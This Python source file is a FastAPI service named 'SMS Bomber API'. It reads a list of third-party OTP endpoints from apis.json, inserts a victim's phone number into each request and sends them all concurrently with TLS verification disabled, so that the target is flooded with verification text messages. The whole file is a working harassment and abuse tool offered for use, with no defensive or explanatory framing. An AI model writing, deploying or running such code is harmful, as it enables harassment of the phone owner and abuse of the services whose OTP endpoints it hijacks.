import json
import asyncio
from fastapi import FastAPI, Query
import httpx

# Load the merged API list from apis.json
with open("apis.json", "r") as f:
    data = json.load(f)
    apis = data["apis"]

app = FastAPI(title="SMS Bomber API", description="Hit all APIs from apis.json with a given phone number")

def substitute_phone(api: dict, phone: str) -> dict:
    """Replace phone placeholders in URL, body, and headers."""
    api = api.copy()
    # Replace in URL
    api["url"] = api["url"].replace("*****", phone).replace("{{phone}}", phone)
    # Replace in body if present
    if "body" in api and api["body"]:
        api["body"] = api["body"].replace("*****", phone).replace("{{phone}}", phone)
    # Replace in headers (just in case)
    if "headers" in api:
        for key, value in api["headers"].items():
            if isinstance(value, str):
                api["headers"][key] = value.replace("*****", phone).replace("{{phone}}", phone)
    return api

async def send_one(api: dict, client: httpx.AsyncClient, phone: str) -> dict:
    """Execute a single API request."""
    substituted = substitute_phone(api, phone)
    method = substituted.get("method", "get").upper()
    url = substituted["url"]
    headers = substituted.get("headers", {})
    body = substituted.get("body", "")
    try:
        if method == "GET":
            resp = await client.get(url, headers=headers, timeout=30.0)
        elif method == "POST":
            content_type = headers.get("content-type", "")
            if "application/json" in content_type:
                # Parse body as JSON (if possible)
                try:
                    json_data = json.loads(body) if body else {}
                except:
                    json_data = {}
                resp = await client.post(url, headers=headers, json=json_data, timeout=30.0)
            else:
                resp = await client.post(url, headers=headers, data=body, timeout=30.0)
        else:
            return {"id": api.get("id"), "name": api.get("name"), "success": False, "status": None, "error": f"Unsupported method: {method}"}
        return {
            "id": api.get("id"),
            "name": api.get("name"),
            "success": 200 <= resp.status_code < 400,
            "status": resp.status_code,
            "error": None
        }
    except Exception as e:
        return {
            "id": api.get("id"),
            "name": api.get("name"),
            "success": False,
            "status": None,
            "error": str(e)
        }

@app.get("/")
async def bomber(sms: str = Query(..., description="Phone number (11 digits, e.g. 017xxxxxxxx)")):
    """Send OTP requests to all APIs with the given phone number."""
    # Limit concurrency to avoid overwhelming the network
    semaphore = asyncio.Semaphore(20)

    async def limited_send(api):
        async with semaphore:
            async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
                return await send_one(api, client, sms)

    tasks = [limited_send(api) for api in apis]
    results = await asyncio.gather(*tasks)

    total = len(results)
    success = sum(1 for r in results if r.get("success"))
    return {
        "total": total,
        "success": success,
        "failure": total - success,
        "results": results
    }

# For local development
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
